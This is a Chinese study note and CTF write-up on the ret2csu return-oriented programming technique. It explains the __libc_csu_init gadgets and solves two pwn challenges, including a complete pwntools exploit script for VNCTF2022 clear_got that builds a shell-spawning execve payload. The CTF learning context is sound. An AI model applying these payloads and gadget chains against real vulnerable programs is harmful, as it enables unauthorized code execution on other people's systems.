# 优秀的学习文章
[关于学习ret2csu的总结 | ZIKH26](https://www.cnblogs.com/ZIKH26/articles/15910485.html)

# Why ret to csu？
当程序给的gadget不够，或者输入长度受限时，可以考虑利用csu中的众多gadget以及一个call指令来劫持控制流。

# __libc_csu_init

汇编源码:
```c
.text:0000000000400790 ; void __fastcall _libc_csu_init(unsigned int, __int64, __int64)
.text:0000000000400790                 public __libc_csu_init
.text:0000000000400790 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:0000000000400790 ; __unwind {
.text:0000000000400790                 push    r15
.text:0000000000400792                 push    r14
.text:0000000000400794                 mov     r15d, edi
.text:0000000000400797                 push    r13
.text:0000000000400799                 push    r12
.text:000000000040079B                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004007A2                 push    rbp
.text:00000000004007A3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004007AA                 push    rbx
.text:00000000004007AB                 mov     r14, rsi
.text:00000000004007AE                 mov     r13, rdx
.text:00000000004007B1                 sub     rbp, r12
.text:00000000004007B4                 sub     rsp, 8
.text:00000000004007B8                 sar     rbp, 3
.text:00000000004007BC                 call    _init_proc
.text:00000000004007C1                 test    rbp, rbp
.text:00000000004007C4                 jz      short loc_4007E6
.text:00000000004007C6                 xor     ebx, ebx
.text:00000000004007C8                 nop     dword ptr [rax+rax+00000000h]
.text:00000000004007D0
.text:00000000004007D0 loc_4007D0:                             ; CODE XREF: __libc_csu_init+54↓j
.text:00000000004007D0                 mov     rdx, r13
.text:00000000004007D3                 mov     rsi, r14
.text:00000000004007D6                 mov     edi, r15d
.text:00000000004007D9                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]
.text:00000000004007DD                 add     rbx, 1
.text:00000000004007E1                 cmp     rbx, rbp
.text:00000000004007E4                 jnz     short loc_4007D0
.text:00000000004007E6
.text:00000000004007E6 loc_4007E6:                             ; CODE XREF: __libc_csu_init+34↑j
.text:00000000004007E6                 add     rsp, 8
.text:00000000004007EA                 pop     rbx
.text:00000000004007EB                 pop     rbp
.text:00000000004007EC                 pop     r12
.text:00000000004007EE                 pop     r13
.text:00000000004007F0                 pop     r14
.text:00000000004007F2                 pop     r15
.text:00000000004007F4                 retn
.text:00000000004007F4 ; } // starts at 400790
.text:00000000004007F4 __libc_csu_init endp
```

我们关注这两段代码，
![image-20240711144033441](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\image-20240711144033441.png)

下面的记作gadget1，上面的记作gadget2，因为我们会先执行下面的gadget。
先看gadget1：
第一个的 `add     rsp, 8`我们会直接略过（可以填充8个垃圾字符，也可以直接从0x40059A开始）
后面的6个pop就能控制对应的寄存器。
结合gadget2来看，

1. **rbx**:![image-20240711144455184](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\image-20240711144455184.png)
很显然直接置为0
2. **rbp**:![image-20240711144503008](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\image-20240711144503008.png)
为了满足比较条件，防止jnz跳转，我们将rbp置为1即可
3. **r12**:![image](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\3092507-20240711142605282-1476322534.png)
当我们把rbx置为0后，就是`call [r12]`的调用，所以我们将r12设置为指向待执行函数地址值的地址即可（比如函数的got表）。这里要注意，是一个间接跳转。
那么有时候我们不想call，仅仅只是为了传参怎么办呢？
我们可以调用`_term_proc`这个"空函数"。![image](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\3092507-20240711142808504-1237440250.png)
可以看到call了后对我们没有任何影响。
关于找指向_term__proc地址值的地址的方法
![image](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\3092507-20240711142930492-512597737.png)
4. **r13**:![image](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\3092507-20240711143012311-513315055.png)
可以发现，经过gadget1+gadget2的作用，控制r13就是控制rdx
5. **r14**:同上，控制r14就是控制rsi
6. **r15**:![image](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\3092507-20240711143142865-272384458.png)
这里要注意下，我们只能控制rdi的低32位，也就是edi，所以不能完全的控制rdi的值。不过，一般64位程序中，pop_edi_ret的gadget都是很好找的。
7. 上述6个pop完了过后，填入gadget2的地址即可跳转到gadget2继续执行。

当然，如果并不需要控制寄存器，例如：我们执行完gadget1跳到gadget2然后"滑下来"又到了gadget1，此时我们就直接填充`7*8 = 56`个垃圾字符就行，到达ret时再劫持控制流。

# 几道题目

## [VNCTF2022公开赛]clear_got
[题目](https://buuoj.cn/challenges#[VNCTF2022%E5%85%AC%E5%BC%80%E8%B5%9B]clear_got)

很棒的一道题。
程序很短，![image](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\3092507-20240711114936542-1744650723.png)

这里把got表清空了，而且程序本身的gadget也不大够，可以用ret2csu来打。
由于ret2csu要执行函数需要一个`[r12]`，如果有got表的话直接填入got表，但是这里memset了，就只能考虑程序给的系统调用了。
ret2syscall那里也提到过，可以通过read成功读取的字节数来控制rax。

所以我们第一遍ret2csu先布置好`read(0,bss,59)`的参数，在bss段写入"/bin/sh\x00",p64(syscall)，然后凑够59字节。(64为execve系统调用号为59)
然后再打一遍ret2csu，布置好`execve("/bin/sh\x00",0,0)`的参数，用`[r12]`来调用syscall。

有些细节也要注意：
1. 第一次打完csu的gadget2跳到gadget1时，直接布置execve的参数，不然后面的payload长度会超过限制。
2. 我们第一次csu不需要call调用函数，所以要找一个"空函数"，一般选择`_term_proc`,但是要注意到是`call [r12]`，所以要找一个指向`_term_proc`的地址。gdb![image](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\3092507-20240711115719286-2024452861.png)
3. 第一遍布置完read的参数后我们紧接着布置了第二次，布置完过后才调用syscall(直接控制流调用)，经尝试发现，这个syscall的调用不能放在两次gadget的中间。尽可能保证前面参数布置的流畅性。
4. 为什么我们在传完"/bin/sh\x00"后还要传一个p64(system)？还是一样的，`call [r12]`，所以得通过写在bss段上来造一个间接跳转。

具体看代码吧：
```python
syscall = 0x000000000040077E

csu_g1 = 0x4007EA
csu_g2 = 0x4007D0
bss = 0x601060
p_termproc = 0x600e50

pl = b'a'*0x60 + b'b'*0x8
# read(0,bss,59)  rdi:0 rsi:bss rdx:59
pl += p64(csu_g1) + p64(0) + p64(1) + p64(p_termproc) + p64(59) + p64(bss) + p64(0)
pl += p64(csu_g2)
pl += b'a'*8 # ignore    :    add     rsp, 8
# execve("/bin/sh",0,0)
pl += p64(0) + p64(1) + p64(bss+8)
pl += p64(0) + p64(0)
pl += p64(bss) + p64(syscall) + p64(csu_g2)
sa("///\n",pl)
pl = b'/bin/sh\x00' + p64(syscall)
pl = pl.ljust(59,b"\x00")
sl(pl)

p.interactive()
```
![image](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\3092507-20240711120426490-1274528622.png)

## ciscn_2019_es_7
[题目](https://buuoj.cn/challenges#ciscn_2019_es_7)

在学SROP的时候也是用的这道题，其实用ret2csu也比较好做，只是这里跟上面那道题又有点区别。
vuln就两个系统调用
![image](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\3092507-20240711135844694-959098677.png)

而且程序里面给了mov eax,0F;和mov eax 3B;的gadget，所以SROP和execve都能直接打。
这题没办法写在bss段，只能写在题目给的栈里面。
根据多打印的信息泄露栈地址，从而得到输入的"/bin/sh"的地址，然后用csu简单布置下参数就行。
这道题的话，csu仅仅做的就是一个把rdx和rsi置0的作用，如果想利用`call [r12]`直接调用syscall好像不行？
尝试了下没打通。
![image](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\3092507-20240711140404800-681876656.png)

注释掉的就是想用上一题的打法来打，不知道为什么打不通。
当然，这题有pop_rdi的gadget，输入也足够，所以控制好execve后两个参数后将csu_gadget1填充56个垃圾字符，再劫持控制流打正常的ret2syscall就行。
![image](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\stack\ret2csu\images\3092507-20240711140643305-556540454.png)

---

(所以感觉SROP基本都可以被ret2csu平替？)